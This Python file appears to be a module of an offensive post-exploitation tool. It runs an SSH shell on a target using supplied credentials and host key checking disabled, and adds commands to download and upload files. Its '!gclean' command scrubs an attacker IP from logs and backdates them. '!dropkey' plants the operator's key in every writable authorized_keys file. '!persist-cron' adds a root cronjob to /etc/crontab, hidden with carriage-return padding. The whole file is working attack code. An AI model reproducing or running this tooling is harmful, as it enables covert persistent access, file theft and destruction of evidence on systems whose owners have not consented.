import os
import subprocess
import getpass
import tempfile
import re
from rich.console import Console

console = Console()

def ssh(target_ip, target_port, credential_username, credential_type, credential_value):
    username = credential_username
    cred_type = credential_type
    cred_value = credential_value

    if not all([target_ip, target_port, cred_type, cred_value]):
        console.print("[red]Missing required configuration or credential. Use 'show' to verify.[/red]")
        return

    if cred_type != "password":
        console.print(f"[red]SSH only supports password-based SSH in this function (got: {cred_type})[/red]")
        return

    socket_dir = os.path.join(tempfile.gettempdir(), f"cloak-{getpass.getuser()}")
    os.makedirs(socket_dir, mode=0o700, exist_ok=True)
    socket_path = os.path.join(socket_dir, "ssh.sock")

    console.print(f"[bold green]Starting SSH session to {username}@{target_ip}:{target_port}...[/bold green]")

    try:
        subprocess.run([
            "sshpass", "-p", cred_value,
            "ssh", "-M", "-S", socket_path, "-fnNT",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            f"{username}@{target_ip}", "-p", str(target_port)
        ], check=True)

        while True:
            cmd = input("shell > ").strip()
            if cmd in ["exit", "quit"]:
                break

            elif cmd.startswith("!get "):
                path = cmd.split(" ", 1)[1]
                console.print(f"Downloading {path}...")
                try:
                    sftp_cmd = f"get {path}"
                    subprocess.run([
                        "sshpass", "-p", cred_value,
                        "sftp", "-o", f"ControlPath={socket_path}",
                        "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null",
                        f"{username}@{target_ip}"
                    ], input=sftp_cmd.encode(), check=True)
                except subprocess.CalledProcessError as e:
                    console.print(f"[red]Download failed:[/red] {e}")

            elif cmd.startswith("!put"):
                parts = cmd.split()
                if len(parts) == 2:
                    src, dst = parts[1], "~"
                elif len(parts) == 3:
                    src, dst = parts[1], parts[2]
                else:
                    console.print("[red]Usage: !put <local_file> [remote_path][/red]")
                    continue
                console.print(f"Uploading {src} to {dst}...")
                try:
                    sftp_cmd = f"put {src} {dst}"
                    subprocess.run([
                        "sshpass", "-p", cred_value,
                        "sftp", "-o", f"ControlPath={socket_path}",
                        "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null",
                        f"{username}@{target_ip}"
                    ], input=sftp_cmd.encode(), check=True)
                except subprocess.CalledProcessError as e:
                    console.print(f"[red]Upload failed:[/red] {e}")

            elif cmd.startswith("!gclean"):
                parts = cmd.split()
                if len(parts) != 3:
                    console.print("[red]Usage: !gclean <log_path> <ip>[/red]")
                    continue
                log_path, ip_to_clean = parts[1], parts[2]
                remote_script = f"""
cp {log_path} /tmp/.cloaklog.bak && \
grep -vi '{ip_to_clean}' /tmp/.cloaklog.bak > /tmp/.cloaklog.clean && \
if ! grep -q '{ip_to_clean}' /tmp/.cloaklog.clean; then \
    cp /tmp/.cloaklog.clean {log_path} && \
    echo '[+] Overwritten {log_path} with cleaned log.'; \
    diff /tmp/.cloaklog.clean {log_path}; \
    ts=$(tail -n 1 {log_path} | awk '{{print $1, $2, $3}}'); \
    if [ ! -z "$ts" ]; then \
        touch -md "$ts" {log_path}; \
        echo '[+] Timestamp adjusted to last entry: ' "$ts"; \
    fi; \
else \
    echo '[-] IP still present. Aborting overwrite.'; \
fi"""
                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    remote_script
                ])

            elif cmd == "!dropkey":
                pubkey_path = os.path.expanduser("~/.ssh/id_rsa.pub")
                if not os.path.exists(pubkey_path):
                    console.print(f"[red]SSH public key not found at {pubkey_path}[/red]")
                    continue
                with open(pubkey_path, "r") as f:
                    pubkey = f.read().strip()
                remote_script = f"""
for d in $(find /home -type d -name '.ssh' 2>/dev/null); do
  keyfile="$d/authorized_keys"
  if [ -w "$keyfile" ] || ( [ ! -e "$keyfile" ] && [ -w "$d" ] ); then
    [ -e "$keyfile" ] && ts=$(stat -c "%y" "$keyfile")
    echo '{pubkey}' >> "$keyfile" && echo '[+] Dropped key in: $keyfile'
    [ ! -z "$ts" ] && touch -d "$ts" "$keyfile" && echo '[+] Timestamp restored: ' "$ts"
  fi
done
"""
                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    remote_script
                ])
            elif cmd.startswith("!persist-cron"):
                match_path = re.search(r'--binpath\s+(\S+)', cmd)
                match_interval = re.search(r'--interval\s+(\S+)', cmd)

                binpath = match_path.group(1) if match_path else None
                interval = match_interval.group(1).upper() if match_interval else None

                if not binpath or not interval:
                    console.print("[red]Usage: !persist-cron --binpath <path/to/payload> --interval <interval (e.g., 1H, 2D, 30S)>[/red]")
                    continue

                if interval[-1] not in ['S', 'H', 'D'] or not interval[:-1].isdigit():
                    console.print("[red]Invalid interval format. Use <number><S|H|D> (e.g., 30S, 1H, 2D)[/red]")
                    continue

                number = int(interval[:-1])
                unit = interval[-1]

                if unit == 'S':
                    cron_command = f"/bin/bash -c 'sleep {number}; {binpath}'"
                    cron_entry = f"* * * * * root {cron_command}"
                elif unit == 'H':
                    cron_entry = f"0 */{number} * * * root {binpath}"
                elif unit == 'D':
                    cron_entry = f"0 0 */{number} * * root {binpath}"

                # Hide the line using carriage return + space padding (CyberGladius)
                stealth_line = f'{cron_entry} #\\r{" " * len(cron_entry)}'

                remote_script = f"""
echo -e "{stealth_line}" >> /etc/crontab && echo '[+] Installed hidden cronjob to /etc/crontab'
"""

                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    remote_script
                ])

            else:
                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    cmd
                ])
    finally:
        subprocess.run(["ssh", "-S", socket_path, "-O", "exit", f"{username}@{target_ip}"])

